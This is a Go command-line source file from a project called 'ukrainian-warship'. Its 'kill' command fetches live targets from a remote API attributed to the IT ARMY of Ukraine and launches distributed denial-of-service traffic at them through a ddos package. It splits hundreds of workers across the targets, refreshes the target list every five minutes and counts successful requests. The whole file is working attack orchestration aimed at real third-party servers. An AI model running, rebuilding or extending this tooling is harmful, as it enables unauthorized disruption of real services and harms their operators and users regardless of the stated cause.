/*
Copyright © 2022 NAME HERE <EMAIL ADDRESS>

Licensed under the Apache License, Version 2.0 (the "License");
you may not use this file except in compliance with the License.
You may obtain a copy of the License at

    http://www.apache.org/licenses/LICENSE-2.0

Unless required by applicable law or agreed to in writing, software
distributed under the License is distributed on an "AS IS" BASIS,
WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
See the License for the specific language governing permissions and
limitations under the License.
*/
package cmd

import (
	"fmt"
	"os"
	"os/signal"
	"strconv"
	"time"

	"github.com/seedpockets/ukrainian-warship/pkg/ddos"

	"github.com/briandowns/spinner"

	"github.com/seedpockets/ukrainian-warship/pkg/api_client"

	"github.com/spf13/cobra"
)

// killCmd represents the kill command
var killCmd = &cobra.Command{
	Use:   "kill",
	Short: "Run automatic attack",
	Long: `Fetches IT ARMY of Ukraine targets(from official api) and attacks. 

Periodically updates target list and evenly spreads load among online
targets.

Default worker amount is 512 divided by number of targets.`,
	Run: func(cmd *cobra.Command, args []string) {
		workers, _ := cmd.Flags().GetInt("workers")
		AutoKill(workers)
	},
}

func init() {
	rootCmd.AddCommand(killCmd)
	killCmd.Flags().Int("workers", 0, "--workers=1024")
}

func AutoKill(workers int) {
	clients := Kill(workers)
	fmt.Println("Monitoring accuracy...")
	s := make(chan os.Signal, 1)
	signal.Notify(s, os.Interrupt)
	running := true
	// Stop DDoS on Crtl+C
	go func() {
		for sig := range s {
			fmt.Println("Caught os signal: ", sig.String())
			fmt.Println("Stopping Brrr...")
			running = false
			for i := range clients {
				clients[i].StopBrrr()
			}
			os.Exit(0)
		}
	}()
	// run and refresh targets every 5 min
	for running {
		refresh := true
		refreshTime := time.Now().Add(time.Minute * 5).Unix() // refresh targets interval
		for refresh {
			if time.Now().Unix() > refreshTime {
				for i := range clients {
					fmt.Println("Ukrainian Warship stop brrr...")
					clients[i].StopBrrr()
				}
				refresh = false
			} else {
				clearScreen()
				fmt.Println(string(colorGreen) + "Updates targets every 5 min..." + string(colorReset))
				fmt.Println("Total" + "\t\t" + "Success" + "\t" + "Target")
				var totalRequests int64 = 0
				for _, c := range clients {
					// fmt.Println(c.Target, " ")
					// amount, failed := c.Result()
					// amount, failed := 0, 0
					totalRequests += c.AmountRequests
					fmt.Println(strconv.Itoa(int(c.AmountRequests)) + "\t\t" + strconv.Itoa(int(c.SuccessRequest)) + "\t" + c.Target)
				}
				fmt.Println("Total: ", totalRequests)
			}
			time.Sleep(time.Millisecond * 100)
		}
		clients = Kill(workers)
	}
}

func Kill(workers int) []*ddos.Client {
	targets, err := getTargets()
	if err != nil {
		panic("Could not get targets...")
	}
	var workersPerURL int
	if workers == 0 {
		workersPerURL = 512 / len(targets.Online)
	} else {
		workersPerURL = workers / len(targets.Online)
	}
	// Starting Kill command
	clients := []*ddos.Client{}
	fmt.Println("Loading canons...")
	for i := range targets.Online {
		c := ddos.NewWarship(targets.Online[i], workersPerURL)
		clients = append(clients, c)
	}
	fmt.Println("Ukrainian Warship go brrr...")
	for i := range clients {
		clients[i].GoBrrr()
	}
	return clients
}

func getTargets() (*api_client.Targets, error) {
	clearScreen()
	fmt.Println("Acquiring targets...")
	spin := spinner.New(spinner.CharSets[36], 100*time.Millisecond) // Build our new spinner
	spin.Start()
	targets, err := api_client.GetTargets()
	if err != nil {
		return nil, err
	}
	time.Sleep(1 * time.Second) // Run for some time to simulate work
	spin.Stop()
	fmt.Println("Done...")
	return targets, nil
}

func clearScreen() {
	fmt.Printf("\x1b[2J")
}
